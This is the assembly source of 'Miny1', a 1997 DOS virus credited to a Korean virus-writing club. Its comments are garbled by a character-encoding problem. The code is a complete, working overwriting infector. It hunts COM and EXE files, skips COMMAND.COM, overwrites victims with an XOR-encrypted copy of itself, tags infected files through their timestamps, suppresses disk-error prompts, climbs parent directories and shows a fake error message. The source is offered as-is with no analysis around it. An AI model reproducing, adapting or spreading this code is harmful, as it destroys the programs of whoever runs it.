;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;           Miny1.432                                        CVC #01  97/06
;
;
; ���q : Miny1.432
; �A�b�a : Osiris of CVC,Corea 97.06.01
; ���A : ���w���w �s�a�a��
;
; Miny1 ��a���� ��巡�a.
; �a�� �x�� �i�� ���a�Q �����e �q�q ��ǩ ϩ�a�a ���a.
;
; ���� Miny1 �e SVS(Seoul Virus Society)�� KOV (�a����a�� ���a:Knight Of Virus
; ) �a �A�bЖ���a.
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org     100h
 Entry:        call    Decode                   ; �qѡ Ή��

 Encry_Start:
               Mov     byte ptr S_Find,00       ; COM �q�q���a, EXE �q�q���a
               mov     byte ptr Total,00        ; 3�� �q�q
               Mov     dx,offset Com_File       ; ���e COM �a�� �q�q
               mov     byte ptr Infected,00     ; �q�q�E �����i 0 �a�� �e�a.
               Jmp     Find_File                ; �a�� �x���� ���a

;=================================================
; �A���� �t �w�b
;

 Msg           DB      'Abnormal Program Termination.',0Dh,0Ah,'$'
 Com_File      DB      '*.com',00               ; ���e COM �a��
 Exe_File      DB      '*.exe',00               ; ���e EXE �a��
 Total         DB      ?                        ; �q�q��ǥ��
 Infected      DB      ?                        ; ���q�a�� �q�q�E �a���i
 S_Find        DB      ?                        ; �q�q��ǡ�� ���e �wȁ
 UP            DB      '..',00                  ; �w�ᝡ ����

 Vir_Msg       DB ' Miny1 Virus - bug fix version   97/06/01',0Dh,0Ah
               DB ' (c) Copyleft 1997 by Osiris of CVC,Corea ',0Dh,0Ah
               DB ' CVC ? Corean Virus Club',0Dh,0Ah,'$'

               mov     bx,ds
               xor     ax,ax
               mov     ds,ax
               push    DS:[0090h]               ; Int 24h �t ��w
               Push    DS:[0092h]

               mov     DS:[0090h],offset NewInt24   ; Int 24h �a����
               mov     DS:[0092h],cs

               Push    CS                       ; cs=ds
               Pop     DS
 Find_File:
               Mov     ah,4Eh                   ; �a�� �x��
               Mov     cx,00100011B             ; �a�� ����
 Find:         Int     21h
               Jc      Find_EXE                 ; �A��?
 ChkInfect:
               mov     ax, DS:[0080h+1Eh]
               cmp     ax,'OC'                  ; COMMAND.COM ���a ?
               jz      Find_NEXT
               Mov     al, DS:[0080h+22]        ; �q�q �a�� ��a
               And     al,1Fh                   ; 62 �� ���a?
               Cmp     al,1Fh
               Jnz     InfectFile
               inc     byte ptr INFECTED        ; �q�q�E �a��
 Find_NEXT:
               Mov     ah,4Fh                   ; �a�q �a�� ��a
               JMP     Find                     ;

 InfectFile:
               mov     ax,4301h                 ; �����i ����/�a���� �e�e�a.
               xor     cx,cx                    ; DTA �a 0080h ���� ���b�a�a��
               mov     dx,0080h+1eh
               int     21h

               mov     ax,3d02h                 ; ���e/�a���� ���e
               int     21h

               xchg    ax,bx                    ; AX �A Ѕ�i ����
               mov     ax,5700h                 ; ���e �苡
               int     21h
               push    cx
               push    dx

               xor     ax,ax                    ; ������ ���e �苡 (�qѡ��
               mov     es,ax                    ; �A �a�w)
               mov     al,byte ptr ES:[046Ch]   ; 0000:046Ch
               Push    CS                       ;
               Pop     ES                       ;
               mov     Key_Value,al             ; Key_Value = �qѡǡ �t
               call    Write_Vir                ; �a����a �a�� ѡ

               pop     dx                       ; ���e ����
               pop     cx
               or      cx,+1Fh                  ; ���i 62�� �� �a��
               mov     ax,5701h                 ; ���e ����(���� ���e)
               int     21h

               mov     ah,3eh                   ; �a�� �h��
               Int     21h
               cmp     byte ptr Total,3         ; 3�� �q�q���v�a?
               jz      Stop_Virus
               Inc     byte ptr Total           ; 1 �w�a
               JMP     Find_NEXT
 Find_EXE:
               cmp     byte ptr S_Find,1        ; 01���e EXE �a���� �q�q���v�a.
               Jnz     DX_EXE
               mov     dx, offset UP            ; �w�� ���Bɡ���� ����
               mov     ah,3Bh
               Int     21h
               jc      Stop_Virus               ; ���a ���Bɡ�� ���a ?
               mov     byte ptr S_Find,00       ; COM �a�� ���� �q�q
               mov     dx, offset COM_File
               jmp     Find_File
 DX_EXE:
               Mov     byte ptr S_Find,01       ; EXE �a���i �q�q���a�a.
               Mov     dx,offset Exe_File       ;
               Jmp     Find_File

 Stop_Virus:
               xor     ax,ax                    ; ���� Int 24h �� �a��
               mov     ds,ax
               pop     DS:[0092h]
               pop     DS:[0090h]
               Push    CS
               Pop     DS
               mov     dx, offset Msg           ; ���w�ⷥ �A�ᝡ �a�w
               cmp     byte ptr Infected,15     ; 15�� �q�q���v�a�e �A����
               jb      PrtMsg
               mov     dx, offset Vir_Msg
               mov     ax,0F044h                ; ���A �w��Ё ���e Ё�w �a����a��
               Int     21h                      ; �w�w ѡ

 PrtMsg:       mov     ah,9                     ; �A���� �b
               Int     21h

               Mov     ax,4C23h                 ; �b���a�A ���a�t�i ���a.
               int     21h

 NewInt24:                                      ; Int 24h �១
               xor     al,al
               IRET

 End_Encry:

;==================================================
;   �a����a �qѡ�� ����
;
 Write_Vir:    call    Decode                   ; �qѡ
               mov     ah,40h                   ; �a����a �a��
               mov     dx, 100h
               mov     cx, offset Vir_END - 100h;
               Int     21h
               call    Decode                   ; �qѡ Ё�A
               RET
 Key_Value     DB      ?

 Decode:
               mov     si, 103h                 ; �qѡ ���b��
               mov     di,si
               mov     ah,Key_value             ; �qѡ ǡ�t
               mov     cx, offset End_Encry - 103h
 E_Ing:
               lodsb                            ; �qѡ��
               xor     al,ah
               stosb
               loop    E_ing
               RET
 Vir_END:

 Miny1         ENDS
               END     Entry
